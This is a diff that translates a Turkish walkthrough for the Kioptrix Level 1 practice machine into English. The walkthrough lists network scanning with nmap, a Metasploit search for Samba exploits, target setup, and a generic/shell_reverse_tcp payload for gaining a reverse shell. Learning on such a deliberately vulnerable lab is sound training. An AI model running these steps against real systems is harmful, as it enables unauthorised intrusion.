@@ -1,17 +1,28 @@
-#Kioptrix Level 1 Çözüm Adımları
+#Kioptrix Level 1 Solution Step
 
-1. ipconfig
-kali linux makinemizin ipsini görüntülüyoruz
-2. nmap (aldığımız ip)/24 
-ağdaki makineleri tarayarak portları görerek kioptrixin ipsini buluyoruz
-3.msfconsole  
-metasploit konsoluna erişir
+1.ipconfig
+View the IP address of the Kali Linux machine.
+
+2.nmap (your_ip)/24
+Scan the network to identify devices and open ports, locating the IP address of the Kioptrix machine.
+
+3.msfconsole
+Access the Metasploit console.
+
 4.search samba
-zafiyetleri görmemize yarar
-5.use (ilgili id)
-exploitlerden bize uygun olanı bulup kullanıyoruz
+Search for vulnerabilities related to Samba services.
+
+5.use (relevant exploit ID)
+Select an appropriate exploit from the search results.
+
 6.options
-zafiyetin sunduğu seçeneklere bakılır
-7.set RHOSTS (sızılacak makine ipsi)
+View available options for the selected exploit.
+
+7.set RHOSTS (target machine IP)
+Set the IP address of the target machine.
+
 8.set PAYLOAD generic/shell_reverse_tcp
-9.run veya exploit
+Configure the payload to establish a reverse TCP shell connection.
+
+9.run or exploit
+Execute the exploit to initiate the connection and potentially gain access to the Kioptrix machine.
